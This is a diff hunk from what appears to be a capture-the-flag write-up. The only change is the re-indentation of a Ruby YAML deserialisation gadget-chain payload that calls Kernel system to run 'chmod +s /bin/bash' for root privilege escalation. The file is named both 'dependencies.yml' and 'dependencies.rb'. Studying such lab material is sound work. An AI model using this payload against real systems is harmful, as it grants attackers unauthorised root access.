@@ -151,25 +151,25 @@ https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-
 So, in this case YAML deserialisation is the attack vector. In the second article, we can find the way we can structure the "dependencies.yml" file so we can execute bash commands.
 
 ```
- ---
- - !ruby/object:Gem::Installer
-     i: x
- - !ruby/object:Gem::SpecFetcher
-     i: y
- - !ruby/object:Gem::Requirement
-   requirements:
-     !ruby/object:Gem::Package::TarReader
-     io: &1 !ruby/object:Net::BufferedIO
-       io: &1 !ruby/object:Gem::Package::TarReader::Entry
-          read: 0
-          header: "abc"
-       debug_output: &1 !ruby/object:Net::WriteAdapter
-          socket: &1 !ruby/object:Gem::RequestSet
-              sets: !ruby/object:Net::WriteAdapter
-                  socket: !ruby/module 'Kernel'
-                  method_id: :system
-              git_set: "chmod +s /bin/bash"
-          method_id: :resolve
+---
+- !ruby/object:Gem::Installer
+   i: x
+- !ruby/object:Gem::SpecFetcher
+   i: y
+- !ruby/object:Gem::Requirement
+ requirements:
+   !ruby/object:Gem::Package::TarReader
+   io: &1 !ruby/object:Net::BufferedIO
+     io: &1 !ruby/object:Gem::Package::TarReader::Entry
+        read: 0
+        header: "abc"
+     debug_output: &1 !ruby/object:Net::WriteAdapter
+        socket: &1 !ruby/object:Gem::RequestSet
+            sets: !ruby/object:Net::WriteAdapter
+                socket: !ruby/module 'Kernel'
+                method_id: :system
+            git_set: "chmod +s /bin/bash"
+        method_id: :resolve
 ```
 
 In "git_set" we can specify the bash command. The command "chmod +s /bin/bash" will allow our user to execute "/bin/bash" as the group that owns the file("root"). After creating the file "dependencies.rb" under the user "henry", we can execute:
